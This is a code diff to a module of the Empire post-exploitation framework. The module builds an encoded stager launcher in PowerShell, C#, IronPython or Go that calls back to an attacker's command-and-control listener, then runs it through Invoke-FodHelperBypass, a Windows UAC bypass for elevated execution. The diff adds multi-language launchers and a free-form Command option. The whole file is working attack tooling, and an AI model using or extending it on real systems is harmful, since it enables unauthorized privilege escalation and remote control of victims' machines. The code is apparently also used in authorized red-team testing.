@@ -1,6 +1,6 @@
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
 
 
 class Module:
@@ -12,15 +12,6 @@ class Module:
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-        # staging options
-        listener_name = params["Listener"]
-        user_agent = params["UserAgent"]
-        proxy = params["Proxy"]
-        proxy_creds = params["ProxyCreds"]
-        launcher_obfuscate_command = params["ObfuscateCommand"]
-        launcher_obfuscate = params["Obfuscate"].lower() == "true"
-
-        # read in the common module source code
         script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
@@ -28,30 +19,72 @@ class Module:
         )
 
         if err:
-            return handle_error_message(err)
+            raise ModuleValidationException(err)
 
-        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-            # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+        command_param = params.get("Command", "")
+        listener_name = params.get("Listener", "")
+        language = params.get("Language", "powershell")
+        obf = params.get("Obfuscate", "False").lower() == "true"
+        obf_cmd = params.get("ObfuscateCommand", "")
+        bypasses = params.get("Bypasses", "")
+        user_agent = params.get("UserAgent", "default")
+        proxy = params.get("Proxy", "default")
+        proxy_creds = params.get("ProxyCreds", "default")
 
-        # generate the PowerShell one-liner with all of the proper options set
-        launcher = main_menu.stagergenv2.generate_launcher(
-            listener_name=listener_name,
-            language="powershell",
-            encode=True,
-            obfuscate=launcher_obfuscate,
-            obfuscation_command=launcher_obfuscate_command,
-            user_agent=user_agent,
-            proxy=proxy,
-            proxy_creds=proxy_creds,
-            bypasses=params["Bypasses"],
-        )
+        if listener_name:
+            lang = language.lower()
+
+            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
+                raise ModuleValidationException(
+                    f"[!] Invalid listener: {listener_name}"
+                )
+
+            if lang == "powershell":
+                launcher = main_menu.stagergenv2.generate_launcher(
+                    listener_name=listener_name,
+                    language="powershell",
+                    encode=True,
+                    obfuscate=obf,
+                    obfuscation_command=obf_cmd,
+                    user_agent=user_agent,
+                    proxy=proxy,
+                    proxy_creds=proxy_creds,
+                    bypasses=bypasses,
+                )
+            elif lang in ("csharp", "ironpython"):
+                launcher = main_menu.stagergenv2.generate_exe_oneliner(
+                    language=lang,
+                    obfuscate=obf,
+                    obfuscation_command=obf_cmd,
+                    encode=True,
+                    listener_name=listener_name,
+                )
+            elif lang == "go":
+                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
+                    language=lang,
+                    obfuscate=obf,
+                    obfuscation_command=obf_cmd,
+                    encode=True,
+                    listener_name=listener_name,
+                )
+            else:
+                raise ModuleValidationException(f"Language '{language}' not supported.")
+
+            if not launcher:
+                raise ModuleValidationException(
+                    "[!] Error in launcher command generation."
+                )
+        else:
+            if not command_param:
+                raise ModuleValidationException(
+                    "Either Listener or Command must be specified."
+                )
+            launcher = command_param
 
         enc_script = launcher.split(" ")[-1]
-        if launcher == "":
-            return handle_error_message("[!] Error in launcher generation.")
 
-        script_end = f'Invoke-FodHelperBypass -Command "{enc_script}"'
+        script_end = f'Invoke-FodHelperBypass -Command "{enc_script}";`nInvoke-FodHelperBypass completed!'
+
         return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
